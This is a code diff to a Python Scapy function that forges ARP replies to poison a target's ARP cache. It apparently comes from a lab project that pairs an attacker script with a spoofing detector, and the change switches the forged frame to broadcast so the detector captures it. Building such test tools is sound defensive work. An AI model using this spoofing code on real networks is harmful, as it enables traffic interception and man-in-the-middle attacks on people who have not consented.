@@ -64,15 +64,21 @@ def spoof(target_ip, target_mac, spoof_ip, iface):
     Send a fake ARP reply to target_ip, telling it that spoof_ip's MAC
     is OUR MAC (the attacker's MAC).
 
+    Uses BROADCAST Ethernet frame so ALL devices on the network
+    (including the detector machine) receive and process the packet.
+    This ensures the detection tool captures the spoofed ARP reply
+    even when attacker and detector run on the same WiFi network.
+
     target_ip  : who we're lying to
     target_mac : the MAC address of the target device
     spoof_ip   : whose IP we're pretending to own
     """
-    # Build fake ARP reply — op=2 means "ARP Reply"
-    pkt = Ether(dst=target_mac) / ARP(
+    # BROADCAST frame — all devices on network receive it
+    # This allows the detector sniffer to capture the packet on WiFi
+    pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
         op=2,                   # ARP Reply
-        pdst=target_ip,         # send to target
-        hwdst=target_mac,       # target's MAC
+        pdst=target_ip,         # intended target IP
+        hwdst=target_mac,       # intended target MAC
         psrc=spoof_ip,          # pretend to be this IP
         # hwsrc defaults to our own MAC automatically
     )
